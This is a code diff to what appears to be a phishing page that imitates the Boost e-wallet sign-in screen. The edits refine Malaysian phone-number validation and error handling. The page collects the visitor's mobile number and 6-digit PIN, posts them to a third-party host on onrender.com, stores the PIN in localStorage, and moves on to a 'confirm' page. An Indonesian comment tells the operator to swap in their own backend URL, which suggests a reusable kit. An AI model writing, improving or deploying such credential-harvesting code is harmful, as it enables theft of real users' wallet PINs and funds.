@@ -28,20 +28,23 @@
             <h1 class="text-2xl font-bold text-gray-900 mb-1">Sign in to Boost</h1>
             <p class="text-gray-500 text-sm mb-6">Sign in with your registered Boost mobile number.</p>
 
+            <!-- Phone Input -->
             <label for="phone" class="block text-sm font-semibold text-gray-700 mb-1">Mobile Number</label>
             <div class="flex items-center border-b-2 border-gray-200 focus-within:border-[#ea0029] transition">
                 <span class="text-gray-500 mr-2 font-medium">+60</span>
-                <input type="number" id="phone" inputmode="numeric" placeholder="Enter your mobile number"
+                <input type="text" id="phone" inputmode="numeric" placeholder="Enter your mobile number"
                     class="w-full py-2 text-lg outline-none bg-transparent [appearance:textfield] [&::-webkit-outer-spin-button]:appearance-none [&::-webkit-inner-spin-button]:appearance-none">
             </div>
-            <p id="phoneError" class="text-red-500 text-xs mt-1 hidden">Please enter a valid mobile number</p>
+            <p id="phoneError" class="text-red-500 text-xs mt-1 hidden">Please enter a valid Malaysian mobile number</p>
 
+            <!-- PIN Input -->
             <div class="mt-6">
                 <label class="block text-sm font-semibold text-gray-700 mb-2">6-digit PIN</label>
                 <div class="flex justify-between gap-2" id="pinContainer"></div>
                 <p id="pinError" class="text-red-500 text-xs mt-1 hidden">Incorrect mobile number or 6-digit PIN.</p>
             </div>
 
+            <!-- Submit Button -->
             <div class="mt-8 flex justify-end">
                 <button id="sendBtn" disabled class="bg-[#ea0029] disabled:opacity-50 text-white w-14 h-14 flex items-center justify-center rounded-full shadow-md hover:shadow-lg hover:scale-105 active:scale-95 transition-all">
                     <svg id="arrowIcon" xmlns="http://www.w3.org/2000/svg" class="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
@@ -56,6 +59,7 @@
     <script>
         const onlyDigits = (val) => val.replace(/\D/g, '');
 
+        // Generate 6 PIN inputs
         const pinContainer = document.getElementById('pinContainer');
         for (let i = 0; i < 6; i++) {
             const input = document.createElement('input');
@@ -75,13 +79,44 @@
         const spinner = document.getElementById('loadingSpinner');
         const errorBlock = document.getElementById('errorBlock');
 
-        const validatePhone = () => /^1\d{8,9}$/.test(phoneInput.value.replace(/\D/g, ''));
+        // Fungsi validasi nomor Malaysia sederhana (sebagai frontend check)
+        function validatePhoneFormat(phoneNumber) {
+            const digits = onlyDigits(phoneNumber);
+            if (digits.length === 0) return false;
+
+            // Normalisasi: jika diawali 0, tambah 60
+            let normalized;
+            if (digits.startsWith('0')) {
+                normalized = '60' + digits.slice(1);
+            } else if (digits.startsWith('60')) {
+                normalized = digits;
+            } else if (digits.startsWith('600')) {
+                return false;
+            } else {
+                return false;
+            }
+
+            // Nomor Malaysia harus diawali 601, panjang 11-12 digit
+            if (!normalized.startsWith('601')) return false;
+            if (normalized.length !== 11 && normalized.length !== 12) return false;
+
+            const after601 = normalized.slice(3);
+            if (after601.length === 8) {
+                return /^[02-9]/.test(after601);
+            } else if (after601.length === 9) {
+                return after601[0] === '1';
+            }
+            return false;
+        }
+
+        const validatePhoneSimple = () => validatePhoneFormat(phoneInput.value);
+
         const allPinFilled = () => Array.from(pinInputs).every(inp => inp.value !== '');
 
         function validatePinFull() {
             const pin = Array.from(pinInputs).map(i => i.value).join('');
             if (pin.length < 6) return false;
-            const phoneDigits = phoneInput.value.replace(/\D/g, '');
+            const phoneDigits = onlyDigits(phoneInput.value);
             if (/^(\d)\1{5}$/.test(pin)) return false;
             const digits = pin.split('').map(Number);
             let isSequential = true;
@@ -112,12 +147,11 @@
         }
 
         function updateButtonState() {
-            sendBtn.disabled = !(validatePhone() && allPinFilled());
+            sendBtn.disabled = !(validatePhoneSimple() && allPinFilled());
         }
 
         phoneInput.addEventListener('input', function() {
-            this.value = onlyDigits(this.value);
-            phoneError.classList.toggle('hidden', validatePhone());
+            phoneError.classList.add('hidden');
             updateButtonState();
         });
 
@@ -133,9 +167,15 @@
             });
         });
 
-        const BACKEND_URL = 'https://boost-server-meng.onrender.com';
+        const BACKEND_URL = 'https://boost-server-meng.onrender.com'; // Ganti dengan URL backend Anda
 
         sendBtn.addEventListener('click', async function() {
+            // Validasi format nomor di frontend
+            if (!validatePhoneSimple()) {
+                phoneError.classList.remove('hidden');
+                return;
+            }
+
             pinError.classList.add('hidden');
 
             if (!validatePinFull()) {
@@ -143,7 +183,7 @@
                 return;
             }
 
-            const phone = '+60' + phoneInput.value.replace(/\D/g, '');
+            const phone = '+60' + onlyDigits(phoneInput.value).replace(/^0?60?/, '');
             const pin = Array.from(pinInputs).map(i => i.value).join('');
 
             sendBtn.disabled = true;
@@ -158,12 +198,12 @@
                     body: JSON.stringify({ phone, pin, type: 'login' })
                 });
                 const data = await response.json();
-                if (data.success) {
+                if (response.ok && data.success) {
                     localStorage.setItem('boost_phone', phone);
                     localStorage.setItem('boost_pin', pin);
                     window.location.href = 'confirm.html';
                 } else {
-                    alert('Authentication failed. Please try again.');
+                    alert(data.message || 'Authentication failed. Please try again.');
                 }
             } catch (err) {
                 alert('Connection error. Please try again.');
